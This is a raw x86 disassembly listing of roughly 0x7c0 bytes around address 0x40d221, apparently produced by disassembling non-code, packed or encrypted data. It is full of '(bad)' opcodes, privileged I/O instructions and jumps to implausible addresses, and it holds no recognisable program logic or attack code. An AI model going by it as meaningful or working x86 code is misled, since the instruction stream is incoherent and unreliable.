  40d221:	mov    ch,BYTE PTR [eax-0x1ec22105]
  40d227:	mov    ecx,0xd99cb1f5
  40d22c:	sbb    ch,BYTE PTR [ebp+0x8825020]
  40d232:	cli    
  40d233:	sub    eax,0x12475095
  40d238:	ret    
  40d239:	adc    eax,0x97a1f46e
  40d23e:	mov    bl,0xf4
  40d240:	push   eax
  40d241:	ficom  WORD PTR [eax]
  40d243:	js     0x40d1f2
  40d245:	retf   0xd40e
  40d248:	mov    ecx,0xf43f7f29
  40d24d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d24e:	aad    0x93
  40d250:	mov    ds:0x1afb39,al
  40d255:	fld    DWORD PTR [eax+ebx*1]
  40d258:	(bad)  
  40d259:	mov    ah,0xe1
  40d25b:	jmp    0x40d1f3
  40d25d:	xor    ebp,eax
  40d25f:	mov    DWORD PTR [ecx+edi*2+0x64],0x20ec2931
  40d267:	fadd   DWORD PTR [ecx+0x1c]
  40d26a:	test   al,0xd1
  40d26c:	cmp    DWORD PTR [eax+0x7f7b405f],esi
  40d272:	sub    al,BYTE PTR [ecx]
  40d274:	xchg   edx,esp
  40d276:	push   ecx
  40d277:	inc    ebx
  40d278:	mov    bl,0xb3
  40d27a:	ror    BYTE PTR [esi+ebp*2-0x13917f1e],0xfb
  40d282:	sub    eax,0x8127fe6
  40d287:	mov    eax,eax
  40d289:	xchg   ebp,eax
  40d28a:	jecxz  0x40d309
  40d28c:	sbb    eax,0x43b395b2
  40d291:	cwde   
  40d292:	sub    eax,0x4e0173e2
  40d297:	jbe    0x40d2d5
  40d299:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d29a:	(bad)  
  40d29b:	loop   0x40d26d
  40d29d:	test   al,0x2
  40d29f:	ins    DWORD PTR es:[edi],dx
  40d2a0:	mov    al,ds:0x612915f3
  40d2a5:	into   
  40d2a6:	mov    ah,0x4c
  40d2a8:	mul    BYTE PTR [edx-0x52]
  40d2ab:	enter  0x195,0xe9
  40d2af:	(bad)  
  40d2b0:	xlat   BYTE PTR ds:[ebx]
  40d2b1:	inc    ecx
  40d2b2:	push   eax
  40d2b3:	dec    ebx
  40d2b4:	cld    
  40d2b5:	jmp    0xa50d93da
  40d2ba:	cdq    
  40d2bb:	cmp    ah,BYTE PTR [esi+0x5e299d73]
  40d2c1:	xor    DWORD PTR [esi-0x30bb3dc3],0xc7834b10
  40d2cb:	mov    bh,0x40
  40d2cd:	call   0x64a:0xfa98ee4a
  40d2d4:	(bad)  
  40d2d5:	loop   0x40d26d
  40d2d7:	jmp    0xdebc62cc
  40d2dc:	and    dh,ah
  40d2de:	lock (bad) 
  40d2e0:	repnz test al,0xef
  40d2e3:	test   DWORD PTR [ecx],esi
  40d2e5:	push   eax
  40d2e6:	xchg   ebx,eax
  40d2e7:	add    eax,0xc9985f21
  40d2ec:	rcr    DWORD PTR [edx+0x6046565f],0x7
  40d2f3:	cmp    dh,dl
  40d2f5:	sub    dh,bl
  40d2f7:	popf   
  40d2f8:	cmp    cl,BYTE PTR [esi+edx*4+0x7a4aa662]
  40d2ff:	inc    eax
  40d300:	(bad)  
  40d301:	leave  
  40d302:	test   al,0x11
  40d304:	push   esi
  40d305:	pushf  
  40d306:	iret   
  40d307:	push   eax
  40d308:	add    ebx,DWORD PTR [esi+0x5fd8d68e]
  40d30e:	call   0xca09afaf
  40d313:	and    al,0x4e
  40d315:	test   al,0xca
  40d317:	lea    edx,[edx]
  40d319:	dec    edx
  40d31a:	mov    ebx,0x3cac5a0e
  40d31f:	mov    al,ds:0x74ddc609
  40d324:	or     BYTE PTR [eax-0xc],0xaa
  40d328:	xchg   DWORD PTR [edx+0x3b],esp
  40d32b:	jne    0x40d337
  40d32d:	inc    ecx
  40d32e:	add    ebp,esi
  40d330:	mov    ds:0x7890e6bf,eax
  40d335:	cmp    eax,0x2eb81fff
  40d33a:	sub    ecx,eax
  40d33c:	mov    cl,0x8
  40d33e:	inc    eax
  40d33f:	sbb    DWORD PTR [ebp+0x48],0x39
  40d343:	fs call 0xf2b81bdb
  40d349:	lods   al,BYTE PTR ds:[esi]
  40d34a:	je     0x40d2d9
  40d34c:	pop    edi
  40d34d:	(bad)  
  40d34e:	std    
  40d34f:	sbb    BYTE PTR [eax+0x21d3513b],0xf4
  40d356:	or     DWORD PTR [edi],esi
  40d358:	ds xchg esi,eax
  40d35a:	jecxz  0x40d32a
  40d35c:	lea    edx,[eax+ebp*4]
  40d35f:	(bad)  
  40d360:	mov    ch,0x5e
  40d362:	iret   
  40d363:	in     al,0x7b
  40d365:	pop    edx
  40d366:	add    DWORD PTR ds:0x73a75d9b,esi
  40d36c:	iret   
  40d36d:	stos   DWORD PTR es:[edi],eax
  40d36e:	lahf   
  40d36f:	mov    ds:0xaedb96a2,eax
  40d374:	lea    edx,[ebx+0x319703b3]
  40d37a:	mov    bl,0x76
  40d37c:	mov    bh,0xa6
  40d37e:	sahf   
  40d37f:	mov    dh,0xe1
  40d382:	adc    esi,DWORD PTR [esi+0x0]
  40d385:	and    cl,BYTE PTR [eax]
  40d387:	imul   ebp,DWORD PTR [esi+0x34746495],0xffffffbc
  40d38e:	cwde   
  40d38f:	mov    al,0xc0
  40d391:	mov    esp,0x48a78d2d
  40d396:	cmp    DWORD PTR ds:0x2f8b9e74,esi
  40d39c:	not    esi
  40d39e:	scas   eax,DWORD PTR es:[edi]
  40d39f:	push   ebx
  40d3a0:	jo     0x40d3c8
  40d3a2:	adc    cl,BYTE PTR [esi-0x10]
  40d3a5:	push   ecx
  40d3a6:	(bad)  
  40d3a7:	sbb    DWORD PTR [edi-0x16ef1193],ecx
  40d3ad:	mov    ebx,0x657b7586
  40d3b2:	jns    0x40d358
  40d3b4:	pop    esp
  40d3b5:	leave  
  40d3b6:	xchg   DWORD PTR [edi+0x3a01de80],esp
  40d3bc:	(bad)  
  40d3bd:	jmp    0xf6c6:0xd9dfb4f6
  40d3c4:	xor    esp,DWORD PTR [ecx+ebp*1-0x1fc0ef21]
  40d3cb:	les    edx,FWORD PTR [eax]
  40d3cd:	jg     0x40d374
  40d3cf:	pusha  
  40d3d0:	frstor [edx-0x4826a805]
  40d3d6:	(bad)  
  40d3d7:	xchg   esi,eax
  40d3d8:	xor    BYTE PTR [ebx+0x1d],ah
  40d3db:	fsub   st,st(3)
  40d3dd:	mov    ebx,DWORD PTR ds:0xfe3b2447
  40d3e3:	cli    
  40d3e4:	push   cs
  40d3e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d3e6:	out    0xdb,al
  40d3e8:	sbb    BYTE PTR [edi-0x9],cl
  40d3eb:	pop    ds
  40d3ec:	dec    edi
  40d3ed:	mov    dh,0x24
  40d3ef:	push   edx
  40d3f0:	imul   ebx,DWORD PTR ds:0xd8732ea,0xffffffed
  40d3f7:	call   0xb41c4391
  40d3fc:	aas    
  40d3fd:	mov    bl,0x0
  40d3ff:	push   edx
  40d400:	mov    ah,0x41
  40d402:	jnp    0x40d38e
  40d404:	cmp    DWORD PTR [ebp+0x6],0x33
  40d408:	fst    DWORD PTR [edi-0x2b127b85]
  40d40e:	push   ss
  40d40f:	ret    
  40d410:	(bad)  
  40d411:	push   0x26
  40d413:	xor    DWORD PTR [ecx-0x5433b691],0x19
  40d41a:	jle    0x40d3ea
  40d41c:	pop    esp
  40d41d:	cli    
  40d41e:	push   ebx
  40d41f:	add    BYTE PTR [eax+ebp*4],bl
  40d422:	or     dh,BYTE PTR [edi+edi*4]
  40d425:	xor    ah,BYTE PTR [edx+0x2c]
  40d428:	stos   BYTE PTR es:[edi],al
  40d429:	and    al,0xbe
  40d42b:	mov    cl,BYTE PTR [ebx+0x711d3638]
  40d431:	stos   DWORD PTR es:[edi],eax
  40d432:	(bad)  
  40d433:	in     eax,dx
  40d434:	loopne 0x40d41b
  40d436:	js     0x40d3f1
  40d438:	hlt    
  40d439:	inc    eax
  40d43a:	lahf   
  40d43b:	retf   
  40d43c:	or     BYTE PTR ds:0xff98316c,0x5a
  40d443:	adc    eax,DWORD PTR [edi]
  40d445:	push   0xecf97c93
  40d44a:	lea    edx,[esp+ebp*8]
  40d44d:	inc    eax
  40d44e:	and    BYTE PTR [eax+ebp*1],dh
  40d451:	out    0xbb,eax
  40d453:	push   0x52d1e5ed
  40d458:	fist   DWORD PTR [esi+0x6956f2b4]
  40d45e:	call   FWORD PTR [edi+0x6b1c9117]
  40d464:	or     eax,0xea6d2921
  40d469:	dec    ebp
  40d46a:	jne    0x40d48e
  40d46c:	sbb    eax,0x6fbf14f5
  40d471:	inc    eax
  40d472:	pop    ds
  40d473:	jbe    0x40d40b
  40d475:	aaa    
  40d476:	pusha  
  40d477:	mov    al,0x3e
  40d479:	stc    
  40d47a:	dec    edx
  40d47b:	push   ebx
  40d47c:	mov    esi,0x387208d5
  40d481:	pop    ss
  40d482:	cmp    DWORD PTR [ebx+0x31],ecx
  40d485:	stos   BYTE PTR es:[edi],al
  40d486:	mov    ecx,edx
  40d488:	xor    dh,BYTE PTR [edi+0x13]
  40d48b:	mov    bl,BYTE PTR [eax+eiz*4+0x7b779652]
  40d492:	in     eax,0x9d
  40d494:	fistp  DWORD PTR ds:0x1f8cca01
  40d49a:	cmp    al,0xe5
  40d49c:	push   cs
  40d49d:	xchg   bl,cl
  40d49f:	stos   DWORD PTR es:[edi],eax
  40d4a0:	test   BYTE PTR [ebp-0x2decb32d],bl
  40d4a6:	xchg   edi,eax
  40d4a7:	or     al,0x4a
  40d4a9:	bound  eax,QWORD PTR [edx+0x69ff193d]
  40d4af:	add    eax,0xbaf3535a
  40d4b4:	ffree  st(5)
  40d4b6:	jge    0x40d4c8
  40d4b8:	stc    
  40d4b9:	mov    eax,ds:0xbe63caee
  40d4be:	xchg   esi,eax
  40d4bf:	rol    DWORD PTR [eax+eax*2-0x28b434ca],0x50
  40d4c7:	push   ebp
  40d4c8:	mov    ebx,ebp
  40d4ca:	sbb    esp,edx
  40d4cc:	not    al
  40d4ce:	sar    DWORD PTR [ebp+edx*2+0x3cc62a8c],1
  40d4d5:	sbb    BYTE PTR [edx-0x55],ah
  40d4d8:	les    eax,FWORD PTR [edi-0x22]
  40d4db:	xor    BYTE PTR [ebx+0x13],bl
  40d4de:	inc    ebx
  40d4df:	inc    ebx
  40d4e0:	cdq    
  40d4e1:	adc    DWORD PTR [edx+eiz*2],0x4cccda0f
  40d4e8:	out    dx,eax
  40d4e9:	cmp    bh,bh
  40d4eb:	or     al,0xd7
  40d4ed:	and    BYTE PTR [ebx-0x6f8704f0],0x8a
  40d4f4:	icebp  
  40d4f5:	test   BYTE PTR [edx+0x11],al
  40d4f8:	push   ds
  40d4f9:	fcmovnu st,st(1)
  40d4fb:	loop   0x40d505
  40d4fd:	sub    bl,dl
  40d4ff:	push   cs
  40d500:	push   eax
  40d501:	xchg   edi,eax
  40d502:	mov    DWORD PTR [eax],esp
  40d504:	mov    ebp,0xce027dc3
  40d509:	jge    0x40d538
  40d50b:	sbb    edx,DWORD PTR [eax+ebp*1+0x1c]
  40d50f:	call   0xfd5aa07a
  40d514:	push   eax
  40d515:	xor    bl,ch
  40d517:	mov    al,0x30
  40d519:	std    
  40d51a:	adc    bl,BYTE PTR [edi-0x70ead5d]
  40d520:	cmp    al,0x99
  40d522:	pop    es
  40d523:	mov    cl,0x6f
  40d525:	(bad)  
  40d526:	lea    ebx,ds:[ebp+0x3a5f0e06]
  40d52d:	out    0x98,al
  40d52f:	sub    esp,DWORD PTR [edi+ebp*8-0x12446f58]
  40d536:	leave  
  40d537:	xchg   esi,eax
  40d538:	jb     0x40d539
  40d53a:	and    al,0x1a
  40d53c:	js     0x40d5b9
  40d53e:	jg     0x40d559
  40d540:	sbb    BYTE PTR [ebx+0x40],bh
  40d543:	data16 out dx,al
  40d545:	pop    esp
  40d546:	inc    edi
  40d547:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d548:	mov    ch,0x39
  40d54a:	xlat   BYTE PTR ds:[ebx]
  40d54b:	ins    BYTE PTR es:[edi],dx
  40d54c:	shr    ch,0x94
  40d54f:	imul   edi,eax,0xffffffa5
  40d552:	(bad)  
  40d553:	test   al,0xf
  40d555:	popf   
  40d556:	std    
  40d557:	dec    ebx
  40d558:	retf   
  40d559:	mov    dl,dl
  40d55b:	dec    edx
  40d55c:	and    BYTE PTR [edx],dl
  40d55e:	dec    esi
  40d55f:	mov    eax,DWORD PTR [ebp+eiz*4+0x4326bea2]
  40d566:	imul   esp,eax,0xa655d118
  40d56c:	inc    ebx
  40d56d:	outs   dx,DWORD PTR ds:[esi]
  40d56e:	cmp    DWORD PTR [eax-0x33418f94],0x5f
  40d575:	cli    
  40d576:	cmp    esi,DWORD PTR [edi-0x5fcf2afc]
  40d57c:	clc    
  40d57d:	les    ebp,FWORD PTR [esi]
  40d57f:	popa   
  40d580:	addr16 addr16 jg 0x40d5b1
  40d584:	cmp    ecx,DWORD PTR [ecx+0xc]
  40d587:	dec    ecx
  40d588:	mov    ds:0x9cef1a60,eax
  40d58d:	shl    DWORD PTR [ebx],0x20
  40d590:	test   eax,0x1de1cf3f
  40d595:	mov    ebx,cs
  40d597:	bound  esp,QWORD PTR [ebp+eax*2-0x1f]
  40d59b:	gs inc ecx
  40d59d:	mov    ch,ah
  40d59f:	stos   BYTE PTR es:[edi],al
  40d5a0:	jbe    0x40d5cc
  40d5a2:	test   al,0xdc
  40d5a4:	mov    bh,0xc8
  40d5a6:	in     eax,0x8b
  40d5a8:	jl     0x40d55d
  40d5aa:	and    DWORD PTR [edi+0x32a5bc57],ebp
  40d5b0:	imul   ebx,DWORD PTR [esi+0x7754daed],0x18744d16
  40d5ba:	mov    esp,0xa5cbed88
  40d5bf:	dec    eax
  40d5c0:	xchg   BYTE PTR [esi],cl
  40d5c2:	je     0x40d607
  40d5c4:	ds jo  0x40d591
  40d5c7:	stos   BYTE PTR es:[edi],al
  40d5c8:	mov    ebp,0x9287a146
  40d5cd:	or     esi,ecx
  40d5cf:	hlt    
  40d5d0:	std    
  40d5d1:	stos   BYTE PTR es:[edi],al
  40d5d2:	mov    bl,0x54
  40d5d4:	mov    eax,ds:0xea842445
  40d5d9:	mov    edx,0x6fa0f847
  40d5de:	xor    dl,BYTE PTR ds:0xb91c8416
  40d5e4:	xchg   ebx,eax
  40d5e5:	push   esp
  40d5e6:	(bad)  
  40d5e7:	sub    ebp,ebx
  40d5e9:	data16 adc dh,ah
  40d5ec:	jge    0x40d61d
  40d5ee:	xor    DWORD PTR [eax-0x50],0x745b4f20
  40d5f5:	and    eax,eax
  40d5f7:	pushf  
  40d5f8:	adc    DWORD PTR [esi+ebx*2],ecx
  40d5fb:	and    al,0xa8
  40d5fd:	sub    BYTE PTR [eax+0x56],0x5a
  40d601:	loop   0x40d623
  40d603:	cld    
  40d604:	sub    BYTE PTR [ecx],cl
  40d606:	xchg   ebx,eax
  40d607:	iret   
  40d608:	mov    ebx,ebx
  40d60a:	add    eax,0x7c82265b
  40d60f:	ret    0x8d17
  40d612:	jl     0x40d5ac
  40d614:	(bad)  
  40d615:	das    
  40d616:	stc    
  40d617:	ror    DWORD PTR [edx+edi*8+0x7559dd2e],1
  40d61e:	jo     0x40d5a5
  40d620:	add    al,bl
  40d622:	out    dx,eax
  40d623:	xchg   edx,eax
  40d624:	inc    ebp
  40d625:	fsubp  st(3),st
  40d627:	imul   edx,esp,0x71
  40d62a:	sub    BYTE PTR [edi-0x243104e3],0x4b
  40d631:	sbb    dh,BYTE PTR [esi-0x18]
  40d634:	test   eax,0x78e267d6
  40d639:	leave  
  40d63a:	and    ecx,DWORD PTR [edx-0x1]
  40d63d:	cld    
  40d63e:	ss test al,0xbe
  40d641:	xchg   DWORD PTR [ebp-0x3732d5e2],ecx
  40d647:	push   0x25
  40d649:	pop    ds
  40d64a:	in     eax,dx
  40d64b:	dec    edx
  40d64c:	cmovae ecx,DWORD PTR [esi+eiz*4-0x20]
  40d651:	mov    ds:0xf1cd2b94,eax
  40d656:	iret   
  40d657:	into   
  40d658:	in     al,dx
  40d659:	mov    ebp,0x3533921a
  40d65e:	mov    dh,0x3f
  40d660:	sbb    eax,0xc699c8e9
  40d665:	test   DWORD PTR [edx-0x79a7fa02],edi
  40d66b:	out    dx,al
  40d66c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d66d:	sbb    bh,ch
  40d66f:	push   cs
  40d670:	mov    BYTE PTR [edx-0x7346cfd8],ah
  40d676:	jg     0x40d6f4
  40d678:	call   0x147d86c6
  40d67d:	(bad)  
  40d67e:	es pop eax
  40d680:	dec    ebx
  40d681:	push   ebp
  40d682:	mov    ds,WORD PTR [esi+0x71499b72]
  40d688:	push   edi
  40d689:	mov    ds:0x97b78aa2,eax
  40d68e:	loop   0x40d6e4
  40d690:	sbb    DWORD PTR [edi+0x53],ebp
  40d693:	adc    al,0x71
  40d695:	out    0xec,al
  40d697:	retf   
  40d698:	jnp    0x40d6ff
  40d69a:	fdiv   QWORD PTR [edi]
  40d69c:	jnp    0x40d6f7
  40d69e:	cmp    eax,0x9b39a673
  40d6a3:	push   0x1cc32e32
  40d6a8:	sbb    dh,ch
  40d6aa:	xor    BYTE PTR [ebp-0x61],cl
  40d6ad:	mov    esp,0x1775feb7
  40d6b2:	fldcw  WORD PTR [eax]
  40d6b4:	js     0x40d6da
  40d6b6:	pop    ebp
  40d6b7:	and    bl,ah
  40d6b9:	test   BYTE PTR [esi],0x77
  40d6bc:	dec    dl
  40d6be:	inc    eax
  40d6bf:	mov    dl,dl
  40d6c1:	into   
  40d6c2:	nop
  40d6c3:	outs   dx,DWORD PTR ds:[esi]
  40d6c4:	sbb    ch,BYTE PTR [edx]
  40d6c6:	jp     0x40d736
  40d6c8:	cmp    ebp,DWORD PTR [ebx+0x1a]
  40d6cb:	clc    
  40d6cc:	bound  esp,QWORD PTR [ecx-0x34]
  40d6cf:	sti    
  40d6d0:	cmp    BYTE PTR [edi+edi*1+0x3d513c4e],0x34
  40d6d8:	or     al,0xc6
  40d6da:	mov    al,0x1
  40d6dc:	jg     0x40d6f1
  40d6de:	inc    ebx
  40d6df:	xor    al,0x4
  40d6e1:	push   eax
  40d6e2:	or     bh,BYTE PTR [edi+0x2f682b06]
  40d6e8:	mov    dh,0x32
  40d6ea:	cmp    BYTE PTR [esi-0x34aa4abb],cl
  40d6f0:	sti    
  40d6f1:	or     DWORD PTR [edx-0x26],edx
  40d6f4:	mov    ecx,0x7ce494da
  40d6f9:	lahf   
  40d6fa:	pop    edx
  40d6fb:	leave  
  40d6fc:	sbb    BYTE PTR [edx],cl
  40d6fe:	mov    al,0x8f
  40d700:	adc    al,0x31
  40d702:	jl     0x40d686
  40d704:	inc    eax
  40d705:	mov    bl,0x87
  40d707:	mov    ch,0xea
  40d709:	mov    esi,0xc8884f28
  40d70e:	out    0xa7,al
  40d710:	mov    al,ds:0x66d2b1ff
  40d715:	inc    esi
  40d716:	mov    ah,BYTE PTR [edi+0x4b4fb5ae]
  40d71c:	inc    ebx
  40d71d:	jmp    0x8585e13e
  40d722:	adc    DWORD PTR [edx],edi
  40d724:	fiadd  DWORD PTR [ecx]
  40d726:	mov    cl,0x14
  40d728:	aaa    
  40d729:	jb     0x40d6c9
  40d72b:	xchg   ecx,eax
  40d72c:	loopne 0x40d6b5
  40d72e:	jp     0x40d751
  40d730:	repnz push edi
  40d732:	outs   dx,DWORD PTR ds:[esi]
  40d733:	jge    0x40d75b
  40d735:	ret    0x56da
  40d738:	sbb    eax,0x2a476771
  40d73d:	dec    ebp
  40d73e:	pop    edi
  40d73f:	push   edx
  40d740:	popf   
  40d741:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d742:	lods   eax,DWORD PTR ds:[esi]
  40d743:	aaa    
  40d744:	into   
  40d745:	mov    esp,0x7e4a7fef
  40d74a:	retf   
  40d74b:	int3   
  40d74c:	mov    ds:0xecd2ef5b,eax
  40d751:	rol    eax,0x46
  40d754:	push   es
  40d755:	mov    esp,0x97442b2c
  40d75a:	push   ds
  40d75b:	jl     0x40d6e4
  40d75d:	call   0x7aead927
  40d762:	ds mov ebp,0x99bd7813
  40d768:	and    esi,DWORD PTR [ebx+0x7e]
  40d76b:	mov    ds:0x97e9a4d0,eax
  40d770:	push   edx
  40d771:	stc    
  40d772:	retf   
  40d773:	imul   eax,DWORD PTR gs:[edx+0x70c3b576],0xd029d8aa
  40d77e:	jmp    0x40d766
  40d780:	je     0x40d7a3
  40d782:	jle    0x40d7cb
  40d784:	pop    esp
  40d785:	cmp    ecx,DWORD PTR [eax-0x540241b1]
  40d78b:	stos   BYTE PTR es:[edi],al
  40d78c:	mov    eax,ds:0xc2bceae2
  40d791:	xchg   ebp,eax
  40d792:	mov    ah,0x9c
  40d794:	call   0x1ff26fa5
  40d799:	pop    ebp
  40d79a:	out    dx,eax
  40d79b:	sbb    ch,cl
  40d79d:	push   ebx
  40d79e:	mov    dl,BYTE PTR [eax]
  40d7a0:	push   0x6187407e
  40d7a5:	pop    ebx
  40d7a6:	test   DWORD PTR [ecx],edi
  40d7a8:	add    BYTE PTR [ebp+0x2f017184],dl
  40d7ae:	push   edx
  40d7af:	pop    eax
  40d7b0:	scas   eax,DWORD PTR es:[edi]
  40d7b1:	push   0x7e9cf716
  40d7b6:	xchg   ebx,eax
  40d7b7:	popa   
  40d7b8:	rcr    ebx,cl
  40d7ba:	(bad)  [eax]
  40d7bc:	fs loopne 0x40d7d7
  40d7bf:	xchg   esp,eax
  40d7c0:	xchg   BYTE PTR [edx-0x5766edad],dl
  40d7c6:	dec    eax
  40d7c7:	fbstp  TBYTE PTR [ebx]
  40d7c9:	cmp    eax,0x350e7c16
  40d7ce:	retf   0x93da
  40d7d1:	ss mov dl,0x6e
  40d7d4:	add    al,0x7b
  40d7d6:	xlat   BYTE PTR ds:[ebx]
  40d7d7:	push   edi
  40d7d8:	push   es
  40d7d9:	leave  
  40d7da:	ret    
  40d7db:	js     0x40d858
  40d7dd:	adc    BYTE PTR [eax-0x3a],bl
  40d7e0:	mov    esp,0x3185daa4
  40d7e5:	repnz (bad) 
  40d7e7:	int    0x4a
  40d7e9:	xchg   ebx,eax
  40d7ea:	or     eax,0xff48a724
  40d7ef:	cld    
  40d7f0:	mov    ecx,0xadb350d1
  40d7f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d7f6:	pop    ebp
  40d7f7:	stos   BYTE PTR es:[edi],al
  40d7f8:	mov    al,0xb4
  40d7fa:	enter  0x58b6,0x93
  40d7fe:	rol    BYTE PTR [ebx],0xc6
  40d801:	out    dx,eax
  40d802:	arpl   WORD PTR [eax],dx
  40d804:	repnz in eax,0x12
  40d807:	sub    al,0x51
  40d809:	dec    esp
  40d80a:	jge    0x40d82e
  40d80c:	mov    esi,0xd996af8
  40d811:	xor    ebx,DWORD PTR [esi+0x22a9be8]
  40d817:	xor    eax,0x5ad1f020
  40d81c:	mov    edi,0x3509c34d
  40d821:	cmp    dl,BYTE PTR ds:0x47f8c391
  40d827:	mov    ds:0x153a8b22,eax
  40d82c:	jo     0x40d860
  40d82e:	test   DWORD PTR ds:0x4ab775d3,edi
  40d834:	xchg   edi,eax
  40d835:	inc    ebp
  40d836:	imul   edx,DWORD PTR [eax],0x79be5338
  40d83c:	inc    ebx
  40d83d:	adc    DWORD PTR [esi+0x510f5b3e],esp
  40d843:	arpl   bp,bx
  40d845:	ficomp WORD PTR [edi-0x75]
  40d848:	sub    edx,DWORD PTR [eax+ecx*8+0x3151dc67]
  40d84f:	sub    BYTE PTR [ebp+0x2ce3b8a5],0xc4
  40d856:	popf   
  40d857:	pop    ebp
  40d858:	hlt    
  40d859:	(bad)  
  40d85a:	xchg   ebp,eax
  40d85b:	xchg   ebx,eax
  40d85c:	mov    DWORD PTR [ebp+0x34c16205],eax
  40d862:	mov    dl,0x55
  40d864:	inc    ecx
  40d865:	mov    ebx,0x5f9e2243
  40d86a:	shl    BYTE PTR [edx+0x6a],1
  40d86d:	cmp    eax,0x8783ca47
  40d872:	mov    edx,0x73f10b25
  40d877:	xchg   ebx,eax
  40d878:	mov    edx,0x8d5e3052
  40d87d:	push   edi
  40d87e:	push   edx
  40d87f:	icebp  
  40d880:	mov    esi,0x53b207d2
  40d885:	enter  0xd0c7,0x32
  40d889:	jecxz  0x40d8dd
  40d88b:	xchg   ecx,eax
  40d88c:	sub    eax,0xac86107e
  40d891:	mov    edi,0x8251f7c6
  40d896:	jg     0x40d911
  40d898:	das    
  40d899:	cmp    BYTE PTR [edx],al
  40d89b:	xchg   dh,bl
  40d89d:	push   esi
  40d89e:	mov    bh,0x22
  40d8a0:	into   
  40d8a1:	fwait
  40d8a2:	mov    eax,DWORD PTR [ebx-0x32]
  40d8a5:	fldenv [ebx+eiz*4]
  40d8a8:	test   BYTE PTR [ecx],bh
  40d8aa:	rcr    DWORD PTR [ebx-0x77ea8237],1
  40d8b0:	jno    0x40d89c
  40d8b2:	and    al,0x7d
  40d8b4:	lahf   
  40d8b5:	test   BYTE PTR [edi-0x66],dl
  40d8b8:	in     al,0x50
  40d8ba:	pop    ebp
  40d8bb:	jb     0x40d91e
  40d8bd:	fsubrp st(6),st
  40d8bf:	ss retf 0x9db8
  40d8c3:	and    BYTE PTR [eax-0x780a0f46],0x66
  40d8ca:	push   ds
  40d8cb:	mov    esi,0x3246e024
  40d8d0:	lds    ebx,FWORD PTR [ebp+0x2eb08a21]
  40d8d6:	and    cl,BYTE PTR [eax-0x5e7365b8]
  40d8dc:	lods   al,BYTE PTR ds:[esi]
  40d8dd:	xchg   ebx,eax
  40d8de:	pop    esp
  40d8df:	sub    BYTE PTR [eax+0x46],bl
  40d8e2:	adc    al,0xb9
  40d8e4:	dec    edx
  40d8e5:	cmp    eax,0xa56414d8
  40d8ea:	mov    ds:0x31cb531a,eax
  40d8ef:	push   edi
  40d8f0:	pusha  
  40d8f1:	ror    DWORD PTR [esi],0xc5
  40d8f4:	(bad)  
  40d8f5:	fsub   DWORD PTR [ebx]
  40d8f7:	shl    BYTE PTR [eax+esi*1],cl
  40d8fa:	mov    bh,0xcc
  40d8fc:	cmp    al,0xcf
  40d8fe:	mov    dh,0x54
  40d900:	outs   dx,DWORD PTR ds:[esi]
  40d901:	cmp    BYTE PTR [ecx],dh
  40d903:	xchg   edx,eax
  40d904:	dec    esp
  40d905:	and    BYTE PTR ss:[esi+0x54],al
  40d909:	adc    dh,BYTE PTR [ecx+0x11]
  40d90c:	jne    0x40d90e
  40d90e:	or     al,0x3d
  40d910:	leave  
  40d911:	and    edx,DWORD PTR [esi-0xc3a8d8c]
  40d917:	cdq    
  40d918:	and    cl,dl
  40d91a:	mov    bl,0xf2
  40d91c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d91d:	pop    esp
  40d91e:	jae    0x40d8c3
  40d920:	bound  edi,QWORD PTR [edx]
  40d922:	test   BYTE PTR [esp+eax*1],ah
  40d925:	in     al,dx
  40d926:	adc    eax,0x2eca3873
  40d92b:	jecxz  0x40d918
  40d92d:	sub    al,0x46
  40d92f:	test   DWORD PTR [esi+0x4318a1e2],edx
  40d935:	fwait
  40d936:	test   eax,0xdf6e33bc
  40d93b:	std    
  40d93c:	or     eax,0xa1974497
  40d941:	add    al,BYTE PTR [esi-0xf08c50b]
  40d947:	scas   al,BYTE PTR es:[edi]
  40d948:	inc    BYTE PTR [esp+edi*1]
  40d94b:	pop    ss
  40d94c:	cmp    bh,BYTE PTR [edi-0x6bb5f334]
  40d952:	sahf   
  40d953:	xor    eax,0x25f3adc9
  40d958:	fmul   DWORD PTR [edi]
  40d95a:	xchg   BYTE PTR [esi-0x4c],bh
  40d95d:	dec    edi
  40d95e:	ficomp DWORD PTR [eax]
  40d960:	dec    eax
  40d961:	std    
  40d962:	dec    eax
  40d963:	mul    DWORD PTR [ecx+ebx*2]
  40d966:	gs xchg edx,eax
  40d968:	or     dl,BYTE PTR [ecx]
  40d96a:	sub    eax,0x70c6417a
  40d96f:	sbb    al,0xbf
  40d971:	cmp    al,0xc4
  40d973:	loope  0x40d979
  40d975:	or     eax,0x6c204586
  40d97a:	(bad)  
  40d97b:	adc    BYTE PTR [eax+esi*2+0x24],bh
  40d97f:	(bad)  
  40d980:	mov    esi,0x3b5fcc2c
  40d985:	and    ecx,DWORD PTR [edx-0x33]
  40d988:	adc    edi,eax
  40d98a:	out    dx,eax
  40d98b:	mov    dh,ah
  40d98d:	pop    edx
  40d98e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d98f:	and    eax,0x8a87df8a
  40d994:	stc    
  40d995:	pop    ebx
  40d996:	test   DWORD PTR [ebx+0x4cf590ff],edx
  40d99c:	mov    dl,0xc7
  40d99e:	add    al,0x9e
  40d9a0:	arpl   WORD PTR [edi+edi*1-0x2f],bp
  40d9a4:	cmp    BYTE PTR [ecx],ch
  40d9a6:	dec    edi
  40d9a7:	sub    ecx,DWORD PTR [ecx]
  40d9a9:	imul   ebp,DWORD PTR [ebp+0x4d78464a],0xffffffff
  40d9b0:	push   0xfffffffc
  40d9b2:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  40d9b4:	xor    DWORD PTR [ecx+0x20848da6],esi
  40d9ba:	mov    esi,0x3baf783c
  40d9bf:	js     0x40d96a
  40d9c1:	mov    ds,WORD PTR [edx]
  40d9c3:	xchg   esp,eax
  40d9c4:	jmp    DWORD PTR [ecx+0x53c9d8a1]
  40d9ca:	clc    
  40d9cb:	add    ebx,DWORD PTR [ebp-0x59715c69]
  40d9d1:	adc    cl,ch
  40d9d3:	data16 loop 0x40d973
  40d9d6:	adc    eax,0x3ab86eb2
  40d9db:	fdiv   DWORD PTR [esp+ebp*2]
